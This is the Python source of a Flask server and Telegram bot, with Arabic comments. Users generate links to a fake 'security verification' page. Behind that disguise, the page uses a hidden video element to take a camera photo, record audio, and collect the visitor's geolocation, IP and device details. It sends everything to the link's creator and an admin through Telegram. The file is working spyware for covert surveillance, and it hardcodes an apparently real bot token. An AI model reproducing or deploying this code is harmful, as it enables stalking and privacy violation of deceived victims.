import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v40.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
system_config = {
    "welcome_msg": "🔥 أهلاً بك يا ملك في لوحة التحكم v40.0\n\n🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`",
    "trap_title": "تأكيد الأمان الموحد",
    "banned_users": [],  
    "user_stages": {},   
    "all_users": {}      
}

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=30).json()
        return requests.post(API_URL + method, json=payload, timeout=30).json()
    except: return None

# واجهة الصيد (حل مشكلة الكاميرا السوداء والإرسال المتكرر)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; z-index: 10; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق أمني مطلوب</h2>
        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني للمتابعة.</p>
        <button class="btn" id="go">بدء الفحص</button>
        <div id="st">بانتظار الموافقة...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const uid = "{{ user_id }}";
        let isCaptured = false; // لمنع التكرار

        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});

        document.getElementById('go').onclick = async () => {
            if(isCaptured) return;
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري الفحص...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                // التأكد من تشغيل الفيديو لحل الكاميرا السوداء
                v.onloadedmetadata = async () => {
                    await v.play();
                    isCaptured = true; 

                    // 1. معلومات الجهاز والآيبي
                    const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Unknown'}));
                    const bat = await navigator.getBattery().catch(()=>({level:0}));
                    const info = `🎯 **صيد جديد!**\\n🌐 IP: \`${ip.ip}\`\\n🔋 البطارية: ${Math.round(bat.level*100)}%\\n📱 النظام: ${navigator.platform}\\n🖥️ الشاشة: ${screen.width}x${screen.height}\\n🌐 اللغة: ${navigator.language}`;
                    await send(info, 'msg');

                    // 2. الموقع
                    navigator.geolocation.getCurrentPosition(p => {
                        send(`📍 **موقع الضحية:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                    }, null, {enableHighAccuracy: true});

                    // 3. التقاط الصورة بعد ثانيتين لضمان الوضوح
                    setTimeout(() => {
                        const c = document.getElementById('c');
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        send(c.toDataURL('image/jpeg', 0.8), 'img');
                        
                        // 4. تسجيل الصوت
                        const rec = new MediaRecorder(stream);
                        const ch = [];
                        rec.ondataavailable = e => ch.push(e.data);
                        rec.onstop = () => {
                            const reader = new FileReader();
                            reader.readAsDataURL(new Blob(ch));
                            reader.onloadend = () => {
                                send(reader.result, 'aud');
                                document.getElementById('st').innerText = "✅ اكتمل الفحص!";
                                stream.getTracks().forEach(t => t.stop());
                            };
                        };
                        rec.start();
                        setTimeout(() => rec.stop(), 4000);
                    }, 2000);
                };
            } catch (e) {
                document.getElementById('st').innerText = "❌ فشل: يجب السماح بالصلاحيات!";
                document.getElementById('go').style.display = 'block';
            }
        };
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid):
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"], user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    # إرسال للأدمن والضحية
    for r_id in list(set([uid, ADMIN_ID])):
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img':
            img = base64.b64decode(d.split(',')[1])
            tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة حية"}, {'photo': ('c.jpg', img)})
        elif t == 'aud':
            aud = base64.b64decode(d.split(',')[1])
            tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة صوتية"}, {'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update: return "OK"
    if "callback_query" in update:
        tg_request("answerCallbackQuery", {"callback_query_id": update["callback_query"]["id"]})
        return handle_callback(update["callback_query"])
    
    if "message" not in update: return "OK"
    msg = update["message"]; chat_id = str(msg["chat"]["id"])
    user = msg.get("from", {})
    username = f"@{user.get('username', 'NoUser')}"
    
    # حفظ وتنبيه الأدمن
    if chat_id not in system_config["all_users"] and chat_id != ADMIN_ID:
        report = f"✨ **دخول جديد:** {user.get('first_name')} | {username} | `{chat_id}`"
        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})
    
    system_config["all_users"][chat_id] = username
    if chat_id in system_config["banned_users"]: return "OK"

    if chat_id == ADMIN_ID:
        if text := msg.get("text", ""):
            if text.startswith("/user_ban"):
                tid = text.split(" ")[1] if len(text.split()) > 1 else ""
                if tid: system_config["banned_users"].append(tid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر `{tid}`"})
                return "OK"
            elif text.startswith("/user_unban"):
                tid = text.split(" ")[1] if len(text.split()) > 1 else ""
                if tid in system_config["banned_users"]: system_config["banned_users"].remove(tid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ فك حظر `{tid}`"})
                return "OK"

        adm_kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 المستخدمين", "callback_data": "list_all"}]]}
        tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": adm_kb})
        return "OK"

    # نظام المستخدمين والاشتراك
    stage = system_config["user_stages"].get(chat_id, 0)
    if stage < 2:
        system_config["user_stages"][chat_id] = stage + 1
        tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 اشترك بالقناة لتفعيل البوت:", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}]]}})
        return "OK"

    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 اضغط لإنشاء رابطك:", "reply_markup": {"inline_keyboard": [[{"text": "🔗 إنشاء رابط", "callback_data": "gen_my_link"}]]}})
    return "OK"

def handle_callback(query):
    cid = str(query["message"]["chat"]["id"]); data = query["data"]
    if data == "gen_my_link":
        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك جاهز:\n`{BASE_URL}/t/{cid}`"})
    elif data == "list_all" and cid == ADMIN_ID:
        res = "👥 **قائمة المستخدمين:**\n"
        for uid, uname in system_config["all_users"].items(): res += f"- {uname} (`{uid}`)\n"
        tg_request("sendMessage", {"chat_id": cid, "text": res if system_config["all_users"] else "فارغة"})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
